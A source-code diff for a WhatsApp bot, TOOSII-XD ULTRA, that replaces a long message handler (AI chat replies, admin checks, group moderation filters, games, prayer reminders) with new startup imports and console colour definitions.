@@ -10,7872 +10,1545 @@ by Toosii Tech • 2024 - 2026
 */
 
 //═════════════════════════════════//
- 
 //━━━━━━━━━━━━━━━━━━━━━━━━//
 // Module
 require("./logger")   // ← Smart log suppressor (load FIRST)
+// Load .env before anything else so SESSION_ID is available
+try { require("dotenv").config() } catch {} // dotenv optional — manual login still works
 require("./setting")
-const { downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia, generateWAMessageFromContent, GroupSettingChange, jidDecode, WAGroupMetadata, emitGroupParticipantsUpdate, emitGroupUpdate, generateMessageID, jidNormalizedUser, generateForwardMessageContent, WAGroupInviteMessageGroupMetadata, GroupMetadata, Headers, delay, WA_DEFAULT_EPHEMERAL, WADefault, getAggregateVotesInPollMessage, generateWAMessageContent, areJidsSameUser, useMultiFileAuthState, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaconnet, makeInMemoryStore, MediaType, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, initInMemoryKeyStore, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WAMediaUpload, mentionedJid, processTime, Browser, MessageType,
-Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, DisconnectReason, WAconnet, getStream, WAProto, isBaileys, AnyMessageContent, templateMessage, InteractiveMessage, Header } = require("gifted-baileys")
-const os = require('os')
+const { default: makeWASocket, DisconnectReason, jidDecode, proto, getContentType, useMultiFileAuthState, downloadContentFromMessage, areJidsSameUser } = require("gifted-baileys")
+const { makeInMemoryStore } = require('./library/lib/store')
+const pino = require('pino')
+const { Boom } = require('@hapi/boom')
 const fs = require('fs')
-const fg = require('api-dylux')
-const fetch = require('node-fetch');
-// Safe JSON fetch — never throws "not valid JSON", returns null on HTML/error responses
-const safeJson = async (url, opts = {}) => {
-    try {
-        const r = await fetch(url, { ...opts, headers: { 'User-Agent': 'TOOSII-XD-ULTRA/2.0', ...(opts.headers || {}) } })
-        const text = await r.text()
-        if (text.trimStart().startsWith('<')) return null  // HTML response (404 page etc)
-        return JSON.parse(text)
-    } catch { return null }
-}
-// Patch fetch Response to never throw on HTML — returns null instead
-const _origJson = require('node-fetch').Response.prototype.json
-require('node-fetch').Response.prototype.json = async function() {
-    const text = await this.text()
-    if (text.trimStart().startsWith('<')) {
-        console.warn('[API] HTML response received instead of JSON — API may be down')
-        return null
-    }
-    try { return JSON.parse(text) } catch(e) {
-        console.warn('[API] Invalid JSON response:', text.slice(0, 80))
-        return null
-    }
-}
+const readline = require("readline");
+const _ = require('lodash')
+const yargs = require('yargs/yargs')
+const PhoneNumber = require('awesome-phonenumber')
+const FileType = require('file-type')
+const path = require('path')
+const fetch = require("node-fetch") 
+const { getBuffer } = require('./library/lib/myfunc')
+const { imageToWebp, imageToWebp3, videoToWebp, writeExifImg, writeExifImgAV, writeExifVid } = require('./library/lib/exif')
 
-const util = require('util')
-const axios = require('axios')
-const { exec, execSync } = require("child_process")
-const chalk = require('chalk')
-const nou = require('node-os-utils')
-const moment = require('moment-timezone');
-const path = require ('path');
-const didyoumean = require('didyoumean');
-const similarity = require('similarity');
-const speed = require('performance-now')
-const { Sticker } = require('wa-sticker-formatter');
-const { igdl } = require("btch-downloader");
-const yts = require ('yt-search');
-const FormData = require('form-data');
-//> Scrape <//
-const jktNews = require('./library/scrape/jktNews');
-const otakuDesu = require('./library/scrape/otakudesu');
-const Kusonime = require('./library/scrape/kusonime');
-const { quote } = require('./library/scrape/quote.js');
-const { fdown } = require('./library/scrape/facebook.js')
-
-const {
-        komiku,
-        detail
-} = require('./library/scrape/komiku');
-
-const {
-        wikimedia
-} = require('./library/scrape/wikimedia');
-
-const { 
-        CatBox, 
-        uploadImage
-} = require('./library/scrape/uploader');
-
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// ChatBoAI core function — Anthropic API primary, Pollinations fallback
-// Always responds in English regardless of input language
-async function _runChatBoAI(userMsg, isAutoMode = false) {
-    const _sys = isAutoMode
-        ? `You are a friendly WhatsApp assistant. Always reply in English only, regardless of the language the user writes in. Keep replies short and conversational — 2 to 4 sentences max. Never use markdown formatting like ** or ##.`
-        : `You are ChatBoAI, a smart and helpful assistant. Always reply in English only, no matter what language the user writes in. Be clear, accurate, and helpful. Avoid markdown formatting.`
-
-    // 1. Anthropic Claude API (most reliable)
-    try {
-        const { default: fetch } = require('node-fetch')
-        const _r1 = await fetch('https://api.anthropic.com/v1/messages', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'x-api-key': process.env.ANTHROPIC_API_KEY || '',
-                'anthropic-version': '2023-06-01'
-            },
-            body: JSON.stringify({
-                model: 'claude-haiku-4-5-20251001',
-                max_tokens: 500,
-                system: _sys,
-                messages: [{ role: 'user', content: userMsg }]
-            }),
-            signal: AbortSignal.timeout(15000)
-        })
-        const _d1 = await _r1.json()
-        const _t1 = _d1?.content?.[0]?.text?.trim()
-        if (_t1?.length > 2) return _t1
-    } catch {}
-
-    // 2. Pollinations OpenAI-compatible (free, no key needed)
-    try {
-        const axios = require('axios')
-        const { data: _d2 } = await axios.post('https://text.pollinations.ai/openai', {
-            model: 'openai',
-            messages: [{ role: 'system', content: _sys }, { role: 'user', content: userMsg }],
-            stream: false
-        }, { headers: { 'Content-Type': 'application/json' }, timeout: 15000 })
-        const _t2 = _d2?.choices?.[0]?.message?.content?.trim()
-        if (_t2?.length > 2) return _t2
-    } catch {}
-
-    // 3. Pollinations GET fallback
-    try {
-        const axios = require('axios')
-        const _p3 = encodeURIComponent(`${_sys}\n\nUser: ${userMsg}\n\nAssistant:`)
-        const { data: _d3 } = await axios.get(`https://text.pollinations.ai/${_p3}`, { timeout: 12000, responseType: 'text' })
-        if (_d3 && typeof _d3 === 'string' && _d3.trim().length > 2) return _d3.trim()
-    } catch {}
-
-    throw new Error('All AI services unavailable')
+const c = {
+    r: '\x1b[0m',
+    bold: '\x1b[1m',
+    dim: '\x1b[2m',
+    green: '\x1b[32m',
+    cyan: '\x1b[36m',
+    yellow: '\x1b[33m',
+    red: '\x1b[31m',
+    magenta: '\x1b[35m',
+    blue: '\x1b[34m',
+    white: '\x1b[37m',
+    bgGreen: '\x1b[42m',
+    bgCyan: '\x1b[46m',
+    bgYellow: '\x1b[43m',
+    bgRed: '\x1b[41m',
+    bgMagenta: '\x1b[45m',
+    bgBlue: '\x1b[44m',
 }
 
-module.exports = async (X, m) => {
-try {
-const from = m.key.remoteJid
-var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply?.selectedRowId || m.text) : ""
-body = body || ""
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// library
-const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./library/lib/myfunc')
-
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Main Setting (Admin And Prefix ) 
-const budy = (typeof m.text === 'string') ? m.text : '';
-const mess = global.mess || {};
-const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
-const prefix = global.botPrefix ? global.botPrefix : (prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.');
-const isCmd = global.botPrefix ? body.startsWith(global.botPrefix) : body.startsWith(prefix);
-const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
-const args = body.trim().split(/ +/).slice(1)
-const text = q = args.join(" ")
-const sender = m.key.fromMe ? (X.user.id.split(':')[0]+'@s.whatsapp.net' || X.user.id) : (m.key.participant || m.key.remoteJid)
-const botNumber = await X.decodeJid(X.user.id)
-const senderNumber = sender.split('@')[0].split(':')[0]
-const botNum = botNumber.split('@')[0].split(':')[0]
-const ownerNums = [...global.owner].map(v => v.replace(/[^0-9]/g, ''))
-
-const botJid = X.decodeJid(X.user.id)
-let botLidRaw = X.user?.lid || null
-if (!botLidRaw) {
-    try {
-        const _fs = require('fs')
-        const _path = require('path')
-        const phoneNum = (X.user.id || '').split(':')[0].split('@')[0]
-        const credsPaths = [
-            _path.join(__dirname, 'sessions', phoneNum, 'creds.json'),
-            _path.join(__dirname, 'sessions', 'creds.json'),
-            _path.join(__dirname, 'auth_info_baileys', 'creds.json'),
-            _path.join(__dirname, '..', 'sessions', phoneNum, 'creds.json'),
-            _path.join(__dirname, '..', 'sessions', 'creds.json'),
-            _path.join(__dirname, '..', 'auth_info_baileys', 'creds.json'),
-        ]
-        for (const cp of credsPaths) {
-            if (_fs.existsSync(cp)) {
-                const creds = JSON.parse(_fs.readFileSync(cp, 'utf-8'))
-                if (creds?.me?.lid) {
-                    botLidRaw = creds.me.lid
-                    X.user.lid = botLidRaw
-                    break
-                }
-            }
-        }
-    } catch (e) {}
-}
-const botLid = botLidRaw ? X.decodeJid(botLidRaw) : null
-
-const senderJid = m.sender || sender
-const senderFromKey = m.key?.participant ? X.decodeJid(m.key.participant) : null
-
-function isSameUser(participantId, targetId) {
-    if (!participantId || !targetId) return false
-    try { return areJidsSameUser(participantId, targetId) } catch { }
-    const pUser = participantId.split(':')[0].split('@')[0]
-    const tUser = targetId.split(':')[0].split('@')[0]
-    return pUser === tUser
-}
-
-function isParticipantBot(p) {
-    if (!p || !p.id) return false
-    if (isSameUser(p.id, X.user.id)) return true
-    if (X.user?.lid && isSameUser(p.id, X.user.lid)) return true
-    if (isSameUser(p.id, botJid)) return true
-    if (botLid && isSameUser(p.id, botLid)) return true
-    return false
-}
-
-function isParticipantSender(p) {
-    if (!p || !p.id) return false
-    if (isSameUser(p.id, senderJid)) return true
-    if (senderFromKey && isSameUser(p.id, senderFromKey)) return true
-    if (m.sender && isSameUser(p.id, m.sender)) return true
-    if (m.key?.participant && isSameUser(p.id, m.key.participant)) return true
-    if (sender && isSameUser(p.id, sender)) return true
-    return false
-}
-
-const senderClean = senderJid.split(':')[0].split('@')[0]
-const senderKeyClean = senderFromKey ? senderFromKey.split(':')[0].split('@')[0] : null
-const botClean = botJid.split(':')[0].split('@')[0]
-
-const isOwner = (
-    m.key.fromMe ||
-    senderClean === botClean ||
-    ownerNums.includes(senderClean) ||
-    (senderKeyClean && (senderKeyClean === botClean || ownerNums.includes(senderKeyClean)))
-) || false
-
-const isGroup = m.isGroup
-const pushname = m.pushName || `${senderNumber}`
-const isBot = botNumber.includes(senderNumber)
-const quoted = m.quoted ? m.quoted : m
-const mime = (quoted.msg || quoted).mimetype || ''
-const groupMetadata = isGroup ? await X.groupMetadata(from).catch(e => null) : null
-const groupName = isGroup && groupMetadata ? groupMetadata.subject || '' : ''
-const participants = isGroup && groupMetadata ? groupMetadata.participants || [] : []
-const groupAdmins = isGroup && participants.length ? await getGroupAdmins(participants) : []
-
-const isBotAdmins = isGroup && participants.length ? participants.some(p => {
-    return isParticipantBot(p) && (p.admin === 'admin' || p.admin === 'superadmin')
-}) : false
-
-const isAdmins = isGroup ? (isOwner || (participants.length ? participants.some(p => {
-    return isParticipantSender(p) && (p.admin === 'admin' || p.admin === 'superadmin')
-}) : false)) : false
-
-const isSuperAdmin = isGroup && participants.length ? participants.some(p => {
-    return isParticipantSender(p) && p.admin === 'superadmin'
-}) : false
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Setting Console
-if (m.message) {
-    const _mtype = Object.keys(m.message)[0] || 'unknown'
-    // Skip noisy protocol/system messages — only log real user content
-    const _skipTypes = ['protocolMessage','senderKeyDistributionMessage','messageContextInfo','ephemeralMessage']
-    if (!_skipTypes.includes(_mtype)) {
-        const _time = new Date().toLocaleTimeString('en-GB', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' })
-        const _date = new Date().toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' })
-        const _body = budy || (m.mtype ? m.mtype.replace('Message','') : _mtype.replace('Message',''))
-        const _preview = _body.length > 60 ? _body.slice(0, 60) + '\u2026' : _body
-        const _chatLabel = m.isGroup
-            ? 'Group   ' + chalk.cyan(pushname) + chalk.dim(' [' + from.split('@')[0] + ']')
-            : 'Private ' + chalk.cyan(pushname) + chalk.dim(' [' + m.sender.split('@')[0] + ']')
-        const _icon = m.isGroup ? '\uD83D\uDC65' : '\uD83D\uDCAC'
-        const _typeIcons = {imageMessage:'\uD83D\uDDBC\uFE0F ',videoMessage:'\uD83C\uDFA5 ',audioMessage:'\uD83C\uDFB5 ',stickerMessage:'\uD83C\uDF00 ',documentMessage:'\uD83D\uDCC4 ',locationMessage:'\uD83D\uDCCD ',contactMessage:'\uD83D\uDC64 '}
-        const _tIcon = _typeIcons[_mtype] || ''
-        console.log(
-            '\n' +
-            chalk.bgCyan(chalk.black(' MSG ')) + ' ' + chalk.dim(_date) + ' ' + chalk.bold(_time) + '\n' +
-            chalk.dim('  \u251C ') + chalk.yellow('From    ') + chalk.green(pushname) + chalk.dim(' (' + m.sender.split('@')[0] + ')') + '\n' +
-            chalk.dim('  \u251C ') + chalk.yellow(_icon + ' Chat    ') + _chatLabel + '\n' +
-            chalk.dim('  \u2514 ') + chalk.yellow('\uD83D\uDCAC Text    ') + chalk.white(_tIcon + _preview)
-        )
-    }
-}
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Auto Fake Presence (typing/recording/online)
-if (global.fakePresence && global.fakePresence !== 'off' && !m.key.fromMe) {
-    try {
-        if (global.fakePresence === 'typing') {
-            await X.sendPresenceUpdate('composing', from)
-        } else if (global.fakePresence === 'recording') {
-            await X.sendPresenceUpdate('recording', from)
-        } else if (global.fakePresence === 'online') {
-            await X.sendPresenceUpdate('available')
-        }
-    } catch(e) {}
-}
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Reply / Reply Message
-const reply = (teks) => { 
-X.sendMessage(from, { text: teks, contextInfo: { 
-"externalAdReply": { 
-"showAdAttribution": true, 
-"title": "TOOSII-XD ULTRA", 
-"containsAutoReply": true, 
-"mediaType": 1, 
-"thumbnail": fakethmb, 
-"mediaUrl": "https://t.me/toosiitech", 
-"sourceUrl": "https://t.me/toosiitech" }}}, { quoted: m }) }
-
-const reply2 = (teks) => {
-X.sendMessage(from, { text : teks }, { quoted : m })
-}
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Function Area
-try {
-ppuser = await X.profilePictureUrl(m.sender, 'image')
-} catch (err) {
-ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
-}
-ppnyauser = await getBuffer(ppuser)
-
-const reSize = async(buffer, ukur1, ukur2) => {
-   return new Promise(async(resolve, reject) => {
-      let jimp = require('jimp')
-      var baper = await jimp.read(buffer);
-      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
-      resolve(ab)
-   })
-}
-    const fakethmb = await reSize(ppuser, 300, 300)
-    // function resize
-    let jimp = require("jimp")
-const resize = async (image, width, height) => {
-    const read = await jimp.read(image);
-    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
-    return data;
-};
-
-const safeSendMedia = async (jid, mediaObj, options = {}, sendOpts = {}) => {
-    try {
-        for (const key of ['image', 'video', 'audio', 'document', 'sticker']) {
-            if (mediaObj[key]) {
-                const val = mediaObj[key];
-                if (val && typeof val === 'object' && val.url) {
-                    if (!val.url || val.url === 'undefined' || val.url === 'null' || val.url === undefined) {
-                        return reply('Media URL is not available. The source may be down.');
-                    }
-                } else if (val === undefined || val === null) {
-                    return reply('Media data is not available. Please try again later.');
-                }
-            }
-        }
-        await X.sendMessage(jid, mediaObj, sendOpts);
-    } catch (err) {
-        console.error('Safe media send error:', err.message);
-        reply('Failed to send media: ' + (err.message || 'Unknown error'));
-    }
-};
-
-const userDbPath = './database/users.json';
-function loadUsers() {
-    try {
-        if (!fs.existsSync(userDbPath)) return {};
-        return JSON.parse(fs.readFileSync(userDbPath));
-    } catch { return {}; }
-}
-function saveUsers(data) {
-    if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
-    fs.writeFileSync(userDbPath, JSON.stringify(data, null, 2));
-}
-function trackUser(senderJid, name, cmd) {
-    let users = loadUsers();
-    const now = new Date().toISOString();
-    if (!users[senderJid]) {
-        users[senderJid] = { name: name, firstSeen: now, lastSeen: now, commandCount: 0, commands: {} };
-    }
-    users[senderJid].name = name;
-    users[senderJid].lastSeen = now;
-    users[senderJid].commandCount = (users[senderJid].commandCount || 0) + 1;
-    if (cmd) {
-        users[senderJid].commands[cmd] = (users[senderJid].commands[cmd] || 0) + 1;
-    }
-    saveUsers(users);
-}
-
-if (isCmd && command) {
-    trackUser(sender, pushname, command);
-    if (!isOwner && !isBot) {
-        const userData = loadUsers();
-        if (userData[sender]?.banned) {
-            return reply('You have been banned from using this bot. Contact the admin for assistance.');
-        }
-    }
-}
-
-if (global.pmBlocker && !m.isGroup && !isOwner && !isBot && !m.key.fromMe) {
-    return
-}
-
-if (global.autoReact && m.key && !m.key.fromMe) {
-    try { await X.sendMessage(m.chat, { react: { text: global.autoReactEmoji || '👍', key: m.key } }) } catch {}
-}
-
-if (m.isGroup && !isAdmins && !isOwner) {
-    if (global.antiBadword && budy) {
-        let badwords = ['fuck', 'shit', 'bitch', 'asshole', 'bastard', 'dick', 'pussy', 'nigga', 'nigger']
-        let hasBadword = badwords.some(w => budy.toLowerCase().includes(w))
-        if (hasBadword && isBotAdmins) {
-            await X.sendMessage(m.chat, { delete: m.key })
-            await X.sendMessage(from, { text: `@${sender.split('@')[0]} watch your language! Badword detected.`, mentions: [sender] })
-        }
-    }
-    if (global.antiTag && m.mentionedJid && m.mentionedJid.length > 5 && isBotAdmins) {
-        await X.sendMessage(m.chat, { delete: m.key })
-        await X.sendMessage(from, { text: `@${sender.split('@')[0]} mass tagging is not allowed!`, mentions: [sender] })
-        return
-    }
-    if (global.antiSticker && m.mtype === 'stickerMessage' && isBotAdmins) {
-        await X.sendMessage(m.chat, { delete: m.key })
-        return
-    }
-}
-
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Leaderboard Games
-const leaderboardPath = './database/leaderboard.json';
-
-// Load leaderboard
-function loadLeaderboard() {
-  if (!fs.existsSync(leaderboardPath)) return {};
-  return JSON.parse(fs.readFileSync(leaderboardPath));
-}
-
-// Save leaderboard
-function saveLeaderboard(data) {
-  fs.writeFileSync(leaderboardPath, JSON.stringify(data, null, 2));
-}
-
-if (
-  global.tebakGame &&
-  global.tebakGame[m.sender] &&
-  m.quoted &&
-  m.quoted.text &&
-  m.quoted.text.includes(global.tebakGame[m.sender].soal)
-) {
-  const game = global.tebakGame[m.sender];
-  const jawaban = game.jawaban;
-  const petunjuk = game.petunjuk || 'No hint available';
-  const teksUser = m.body?.toLowerCase();
-
-  if (teksUser === 'nyerah' || teksUser === 'giveup') {
-    clearTimeout(game.timeout);
-    delete global.tebakGame[m.sender];
-    return reply(`😔 You gave up!\nThe correct answer is:\n✅ *${jawaban}*`);
-  }
-
-  const benar = Array.isArray(jawaban)
-    ? jawaban.some(jw => jw.toLowerCase() === teksUser)
-    : teksUser === jawaban.toLowerCase();
-
-  if (teksUser && benar) {
-    let leaderboard = loadLeaderboard();
-    leaderboard[m.sender] = (leaderboard[m.sender] || 0) + 1;
-    saveLeaderboard(leaderboard);
-
-    clearTimeout(game.timeout);
-    delete global.tebakGame[m.sender];
-    return reply('✅ Correct! Your answer is right!\n\nType .tebakld to view the leaderboard.');
-  } else if (teksUser) {
-    return reply(`❌ Wrong. Try again!\n💡 Hint: ${petunjuk}\n\nType *giveup* if you want to give up.`);
-  }
-}
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Prayer & Devotion Reminders
-// Globals: global.muslimPrayer / global.christianDevotion
-//   values: 'off' | 'dm' | 'group' | 'all'
-if (!global.muslimPrayer)    global.muslimPrayer    = 'off'
-if (!global.christianDevotion) global.christianDevotion = 'off'
-
-X.autoshalat = X.autoshalat ? X.autoshalat : {}
-        let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? X.user.id : m.sender
-        let id = m.chat
-    if(id in X.autoshalat) {
-    return false
-    }
-
-    // Check if this chat should receive the reminder
-    const _isGroup = m.isGroup
-    const _prayerAllowed = (setting) => {
-        if (!setting || setting === 'off') return false
-        if (setting === 'all') return true
-        if (setting === 'group') return _isGroup
-        if (setting === 'dm') return !_isGroup
-        return false
-    }
-
-    // Skip entirely if both are off for this chat type
-    if (!_prayerAllowed(global.muslimPrayer) && !_prayerAllowed(global.christianDevotion)) {
-        // fall through silently
-    } else {
-
-    // Detect timezone & region from sender's country code
-    const _senderNum = (m.sender || '').split('@')[0]
-    const _cc = _senderNum.startsWith('254') ? '254' :
-                _senderNum.startsWith('255') ? '255' :
-                _senderNum.startsWith('256') ? '256' :
-                _senderNum.startsWith('257') ? '257' :
-                _senderNum.startsWith('250') ? '250' :
-                _senderNum.startsWith('251') ? '251' :
-                _senderNum.startsWith('252') ? '252' :
-                _senderNum.startsWith('253') ? '253' :
-                _senderNum.startsWith('62')  ? '62'  :
-                _senderNum.startsWith('60')  ? '60'  :
-                _senderNum.startsWith('92')  ? '92'  :
-                _senderNum.startsWith('880') ? '880' :
-                _senderNum.startsWith('91')  ? '91'  :
-                _senderNum.startsWith('966') ? '966' :
-                _senderNum.startsWith('971') ? '971' :
-                _senderNum.startsWith('20')  ? '20'  :
-                _senderNum.startsWith('212') ? '212' :
-                _senderNum.startsWith('234') ? '234' : '254'
-
-    const _tzMap = {
-        '254': { tz: 'Africa/Nairobi',       region: 'Kenya' },
-        '255': { tz: 'Africa/Dar_es_Salaam', region: 'Tanzania' },
-        '256': { tz: 'Africa/Kampala',       region: 'Uganda' },
-        '257': { tz: 'Africa/Bujumbura',     region: 'Burundi' },
-        '250': { tz: 'Africa/Kigali',        region: 'Rwanda' },
-        '251': { tz: 'Africa/Addis_Ababa',   region: 'Ethiopia' },
-        '252': { tz: 'Africa/Mogadishu',     region: 'Somalia' },
-        '253': { tz: 'Africa/Djibouti',      region: 'Djibouti' },
-        '62':  { tz: 'Asia/Jakarta',         region: 'Indonesia' },
-        '60':  { tz: 'Asia/Kuala_Lumpur',    region: 'Malaysia' },
-        '92':  { tz: 'Asia/Karachi',         region: 'Pakistan' },
-        '880': { tz: 'Asia/Dhaka',           region: 'Bangladesh' },
-        '91':  { tz: 'Asia/Kolkata',         region: 'India' },
-        '966': { tz: 'Asia/Riyadh',          region: 'Saudi Arabia' },
-        '971': { tz: 'Asia/Dubai',           region: 'UAE' },
-        '20':  { tz: 'Africa/Cairo',         region: 'Egypt' },
-        '212': { tz: 'Africa/Casablanca',    region: 'Morocco' },
-        '234': { tz: 'Africa/Lagos',         region: 'Nigeria' },
-    }
-    const _tzInfo = _tzMap[_cc] || { tz: 'Africa/Nairobi', region: 'Kenya' }
-
-    // Use pushname if available, otherwise clean number
-    const _displayName = (pushname && pushname !== _senderNum && pushname.length > 1)
-        ? pushname : (m.isGroup ? 'everyone' : 'friend')
-
-    const datek = new Date((new Date).toLocaleString("en-US", { timeZone: _tzInfo.tz }))
-    const hours = datek.getHours()
-    const minutes = datek.getMinutes()
-    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
-
-    // ── Muslim Prayer Times ───────────────────────────────────────────
-    if (_prayerAllowed(global.muslimPrayer)) {
-        let jadwalSholat = {}
-        try {
-            const _prayerRes = await fetch(`https://api.aladhan.com/v1/timingsByCity?city=${encodeURIComponent(_tzInfo.region)}&country=${encodeURIComponent(_tzInfo.region)}&method=3`)
-            const _prayerData = await _prayerRes.json()
-            if (_prayerData.code === 200 && _prayerData.data && _prayerData.data.timings) {
-                const t = _prayerData.data.timings
-                jadwalSholat = {
-                    Fajr:    t.Fajr?.slice(0,5),
-                    Dhuhr:   t.Dhuhr?.slice(0,5),
-                    Asr:     t.Asr?.slice(0,5),
-                    Maghrib: t.Maghrib?.slice(0,5),
-                    Isha:    t.Isha?.slice(0,5),
-                }
-            }
-        } catch {}
-        if (!Object.keys(jadwalSholat).length) {
-            jadwalSholat = { Fajr: '05:00', Dhuhr: '12:20', Asr: '15:30', Maghrib: '18:25', Isha: '19:35' }
-        }
-        for(let [sholat, waktu] of Object.entries(jadwalSholat)) {
-            if(timeNow === waktu && !(id in X.autoshalat)) {
-                let caption = `╔══════════════════════════╗\n║  🕌 *PRAYER TIME*\n╚══════════════════════════╝\n\n  As-salamu alaykum, *${_displayName}* 🙏\n\n  ├ 🕌 *${sholat}* prayer time\n  ├ 🕐 *${waktu}*\n  └ 🌍 ${_tzInfo.region}\n\n  _Take your ablution and pray_ 🤲`
-                X.autoshalat[id] = [reply(caption), setTimeout(() => { delete X.autoshalat[m.chat] }, 57000)]
-            }
-        }
-    }
-
-    // ── Christian Devotion Times ──────────────────────────────────────
-    if (_prayerAllowed(global.christianDevotion)) {
-        const _christianTimes = {
-            '06:00': { name: 'Morning Devotion', icon: '🌅', msg: 'Start your day with God. Pray, read the Word, and commit your day to Him.' },
-            '12:00': { name: 'Midday Prayer',    icon: '☀️',  msg: 'Pause midday. Give thanks, seek guidance, and renew your strength in Christ.' },
-            '18:00': { name: 'Evening Prayer',   icon: '🌇', msg: 'As the day winds down, give thanks for His grace and protection.' },
-            '21:00': { name: 'Night Prayer',     icon: '🌙', msg: 'Before you rest, lay your burdens before God. He watches over you.' },
-        }
-        if (_christianTimes[timeNow] && !(id in X.autoshalat)) {
-            const _dev = _christianTimes[timeNow]
-            let _devCaption = `╔══════════════════════════╗\n║  ✝️  *DEVOTION TIME*\n╚══════════════════════════╝\n\n  God bless you, *${_displayName}* 🙏\n\n  ├ ${_dev.icon} *${_dev.name}*\n  ├ 🕐 *${timeNow}*\n  └ 🌍 ${_tzInfo.region}\n\n  _${_dev.msg}_\n\n  _📖 "Call to me and I will answer you" — Jer 33:3_`
-            X.autoshalat[id] = [reply(_devCaption), setTimeout(() => { delete X.autoshalat[m.chat] }, 57000)]
-        }
-    }
-
-    } // end prayer allowed check
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Similarity
-function getCaseNames() {
-  try {
-    const data = fs.readFileSync('./client.js', 'utf8');
-    const casePattern = /case\s+'([^']+)'/g;
-    const matches = data.match(casePattern);
-
-    if (matches) {
-      return matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
-    } else {
-      return [];
-    }
-  } catch (error) {
-    console.error('An error occurred:', error);
-    throw error;
-  }
-}
-
-
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-let totalfitur = () =>{
-var mytext = fs.readFileSync("./client.js").toString()
-var numUpper = (mytext.match(/case '/g) || []).length;
-return numUpper
-        }
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Function Waktu
-function getFormattedDate() {
-  var currentDate = new Date();
-  var day = currentDate.getDate();
-  var month = currentDate.getMonth() + 1;
-  var year = currentDate.getFullYear();
-  var hours = currentDate.getHours();
-  var minutes = currentDate.getMinutes();
-  var seconds = currentDate.getSeconds();
-}
-
-let d = new Date(new Date + 3600000)
-let locale = 'en'
-let week = d.toLocaleDateString(locale, { weekday: 'long' })
-let date = d.toLocaleDateString(locale, {
-  day: 'numeric',
-  month: 'long',
-  year: 'numeric'
-})
-const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })
-
-function msToTime(duration) {
-var milliseconds = parseInt((duration % 1000) / 100),
-seconds = Math.floor((duration / 1000) % 60),
-minutes = Math.floor((duration / (1000 * 60)) % 60),
-hours = Math.floor((duration / (1000 * 60 * 60)) % 24)
-
-hours = (hours < 10) ? "0" + hours : hours
-minutes = (minutes < 10) ? "0" + minutes : minutes
-seconds = (seconds < 10) ? "0" + seconds : seconds
-return hours + " hours " + minutes + " minutes " + seconds + " seconds"
-}
-
-function msToDate(ms) {
-                temp = ms
-                days = Math.floor(ms / (24*60*60*1000));
-                daysms = ms % (24*60*60*1000);
-                hours = Math.floor((daysms)/(60*60*1000));
-                hoursms = ms % (60*60*1000);
-                minutes = Math.floor((hoursms)/(60*1000));
-                minutesms = ms % (60*1000);
-                sec = Math.floor((minutesms)/(1000));
-                return days+" Days "+hours+" Hours "+ minutes + " Minutes";
-  }
-//━━━━━━━━━━━━━━━━━━━━━━━━//
-// Ucapan Waktu
-const timee = moment().tz('Asia/Jakarta').format('HH:mm:ss')
-if(timee < "23:59:00"){
-var waktuucapan = 'Good Night'
-}
-if(timee < "19:00:00"){
-var waktuucapan = 'Good Evening'
-}
-if(timee < "18:00:00"){
-var waktuucapan = 'Good Afternoon'
-}
-if(timee < "15:00:00"){
-var waktuucapan = 'Good Day'
-}
-if(timee < "10:00:00"){
-var waktuucapan = 'Good Morning'
-}
